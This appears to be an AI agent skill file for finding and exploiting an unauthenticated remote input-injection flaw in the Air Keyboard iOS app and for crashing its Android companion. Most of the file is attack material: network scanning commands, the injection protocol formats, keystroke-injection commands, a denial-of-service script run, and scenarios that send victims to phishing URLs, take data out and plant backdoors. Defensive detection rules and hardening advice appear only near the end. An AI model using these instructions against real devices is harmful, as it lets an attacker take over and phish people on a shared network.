---
name: air-keyboard-exploit
description: Exploit unauthenticated remote input injection in Air Keyboard iOS app (port 8888) and Android companion (port 55535). Use this skill whenever you need to discover, test, or exploit the Air Keyboard vulnerability on a local network, or when analyzing mobile apps with similar remote control attack surfaces. Also use for network reconnaissance of mobile remote-control utilities, crafting PoC exploits, or documenting findings in pentest reports.
---

# Air Keyboard Remote Input Injection Exploitation

This skill helps you discover and exploit the unauthenticated remote input injection vulnerability in the Air Keyboard mobile application (iOS App Store ID: 6463187929).

## What This Skill Does

- **Discovers** vulnerable Air Keyboard instances on your local network
- **Exploits** the unauthenticated input injection to inject arbitrary keystrokes
- **Supports** both legacy TCP protocol (≤1.0.4) and WebSocket protocol (≥1.0.5)
- **Tests** Android companion app for DoS conditions
- **Documents** findings for pentest reports

## When to Use This Skill

Use this skill when:
- You're conducting mobile pentesting and need to test for remote control vulnerabilities
- You've identified Air Keyboard or similar remote keyboard apps on a target device
- You need to demonstrate the impact of unauthenticated network services on mobile devices
- You're hunting for similar vulnerabilities in other mobile remote-control utilities
- You need to generate PoC code or documentation for a security assessment

## Quick Start

```bash
# Scan for vulnerable devices
python scripts/scan_air_keyboard.py 192.168.1.0/24

# Inject keystrokes (auto-detects protocol version)
python scripts/inject_keystrokes.py 192.168.1.50 "open -a Calculator"

# Test Android DoS
python scripts/android_dos.py 192.168.1.50
```

## Protocol Details

### Legacy Protocol (≤1.0.4) - Raw TCP

The app listens on port 8888 and accepts binary frames:

```
[length (2 bytes, little-endian)]
[device_id (1 byte)]
[payload (ASCII keystrokes)]
```

The length field includes the device_id byte but not the 2-byte header itself.

### Current Protocol (≥1.0.5) - WebSocket

Version 1.0.5+ migrated to WebSocket on the same port (8888). Messages are JSON:

```json
{
  "type": 1,
  "text": "your keystrokes here",
  "mode": 0,
  "shiftKey": false,
  "selectionStart": 0,
  "selectionEnd": 0
}
```

No authentication is required for either protocol.

## Available Scripts

### 1. `scripts/scan_air_keyboard.py`

Discovers Air Keyboard instances on a network range.

**Usage:**
```bash
python scripts/scan_air_keyboard.py <network_range> [--timeout <seconds>]
```

**Example:**
```bash
python scripts/scan_air_keyboard.py 192.168.1.0/24
python scripts/scan_air_keyboard.py 192.168.1.0/24 --timeout 2
```

**Output:** Lists all devices with port 8888 (iOS) or 55535 (Android) open.

### 2. `scripts/inject_keystrokes.py`

Injects arbitrary keystrokes into a target device. Auto-detects protocol version.

**Usage:**
```bash
python scripts/inject_keystrokes.py <target_ip> <keystrokes> [--protocol <tcp|websocket>]
```

**Examples:**
```bash
# Launch Calculator
python scripts/inject_keystrokes.py 192.168.1.50 "open -a Calculator"

# Open a URL
python scripts/inject_keystrokes.py 192.168.1.50 "https://evil.example.com"

# Force TCP protocol (legacy)
python scripts/inject_keystrokes.py 192.168.1.50 "test" --protocol tcp

# Force WebSocket protocol (current)
python scripts/inject_keystrokes.py 192.168.1.50 "test" --protocol websocket
```

**What it does:**
- Attempts WebSocket first (most common)
- Falls back to TCP if WebSocket fails
- Reports which protocol succeeded
- Works with any printable ASCII including newlines and tabs

### 3. `scripts/android_dos.py`

Tests the Android companion app (port 55535) for DoS conditions.

**Usage:**
```bash
python scripts/android_dos.py <target_ip>
```

**What it does:**
- Sends malformed data to trigger OpenSSL exception
- Crashes the background service (DoS)
- Useful for demonstrating the impact of missing exception handling

### 4. `scripts/protocol_detector.py`

Determines which protocol version a target is running.

**Usage:**
```bash
python scripts/protocol_detector.py <target_ip>
```

**Output:** Reports whether the target uses TCP (≤1.0.4) or WebSocket (≥1.0.5).

## Attack Scenarios

### Scenario 1: Full Remote Control

If you can inject keystrokes, you can:
- Launch any installed app
- Send messages through messaging apps
- Open malicious URLs in the browser
- Toggle settings (WiFi, Bluetooth, etc.)
- Type into any text field the user is currently using

**Example:**
```bash
# Open Safari and navigate to a phishing site
python scripts/inject_keystrokes.py 192.168.1.50 "open -a Safari"
# Wait for Safari to open, then:
python scripts/inject_keystrokes.py 192.168.1.50 "https://phishing.example.com"
```

### Scenario 2: Data Exfiltration

If the user has a text field open (notes, email, etc.), you can:
- Type commands that copy sensitive data to clipboard
- Open apps that might reveal information
- Trigger actions that send data to your server

### Scenario 3: Persistence Testing

Use this vulnerability to demonstrate how an attacker could:
- Install malicious profiles
- Configure malicious settings
- Set up backdoors through legitimate app interfaces

## Detection & Defense

### For Blue Teams

**Network Monitoring:**
```bash
# Hunt for vulnerable services
nmap -n -p 8888,55535 --open 192.168.0.0/16

# Wireshark filter
tcp.port == 8888 or tcp.port == 55535
```

**iOS App Privacy Report:**
Check Settings → Privacy & Security → App Privacy Report for apps contacting LAN addresses.

**EDR Yara-L Rule:**
```yara
rule AirKeyboard_Keystroke {
    strings:
        $json1 = "selectionStart"
        $json2 = "selectionEnd"
    condition:
        $json1 and $json2
}
```

### For Developers

**Hardening Recommendations:**
1. Bind listeners to `127.0.0.1` instead of `0.0.0.0`
2. Implement mutual authentication (mTLS or Noise protocol)
3. Derive per-device secrets during onboarding (QR code or PIN)
4. Use Apple Network Framework with NWListener + TLS
5. Add length-prefix validation and exception handling

## Related Vulnerabilities

This vulnerability pattern appears in other mobile remote-control apps:

| App | CVE | Issue |
|-----|-----|-------|
| Telepad ≤1.0.7 | CVE-2022-45477/78 | Unauthenticated RCE, keylogging |
| PC Keyboard ≤30 | CVE-2022-45479/80 | Unauthenticated RCE, traffic snooping |
| Lazy Mouse ≤2.0.1 | CVE-2022-45481/82/83 | No password, weak PIN, clear-text |

## References

- [Exploit-DB 52333](https://www.exploit-db.com/exploits/52333)
- [Mobile-Hacker Blog](https://www.mobile-hacker.com/2025/07/17/remote-input-injection-vulnerability-in-air-keyboard-ios-app-still-unpatched/)

## Legal Disclaimer

This skill is for authorized security testing only. Ensure you have explicit permission before testing any system. Unauthorized access to computer systems is illegal.

## Troubleshooting

**"Connection refused"**: The target device may not have Air Keyboard installed, or the app isn't running.

**"WebSocket handshake failed"**: The target may be running the legacy TCP protocol. Try `--protocol tcp`.

**"No devices found"**: Verify you're on the same network as the target. Some routers isolate devices.

**"Keystrokes not appearing"**: The target app may not have a text field active. Keystrokes are injected into the currently focused input field.
